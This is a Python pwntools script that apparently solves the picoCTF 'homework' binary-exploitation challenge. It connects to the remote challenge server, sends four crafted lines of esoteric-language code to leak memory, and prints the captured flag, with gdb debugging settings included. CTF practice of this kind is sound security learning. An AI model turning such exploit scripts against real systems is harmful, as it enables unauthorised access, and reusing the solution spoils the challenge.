from pwn import *
from ctypes import CDLL

#####################################################change directory#################################################3
level = "homework"
ip = "mars.picoctf.net:31689"
dir = "/home/ayush/Work/picoCTF/BinaryExploitation/"+level

####################################################operation mode#####################################################
args.DEBUG = False
args.ASLR = False
args.gdbscript = "b *main+364\ndefine hook-stop\nx/2wx 0x555555559078\nx/40wx 0x5555555590a0\nx/20wx 0x555555559260\nx/20wx 0x5555555596ac\nend\n"
args.REMOTE = True
####################################################setup solution#####################################################
context.arch = 'amd64'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
binary = ELF(dir + "/homework")
####################################################start process######################################################
def conn():
    if args.REMOTE:
        return remote(ip.split(':')[0], ip.split(':')[1])
    elif args.DEBUG:
        return gdb.debug(binary.path, aslr=args.ASLR, gdbscript=args.gdbscript)
    else:
        return process([binary.path])
r = conn()
##################################################strings to code###################################################
lines = ["0!:+::+:+:+::+++::*\\v", "v<<<<<<<<<<0p\\+:+:!0<", ">0!+:0!:+::+:+:+::+>v" ,"^<<<<<<<<<<<<<<<,g++<"]

#############################################changing rows and cols###########################################
r.recvuntil("sol")
for line in lines:
    r.sendline(line)
r.recvuntil("{")
flag = b"picoCTF{"+r.recvuntil("}")
log.info(b"Flag: " + flag)
r.close()
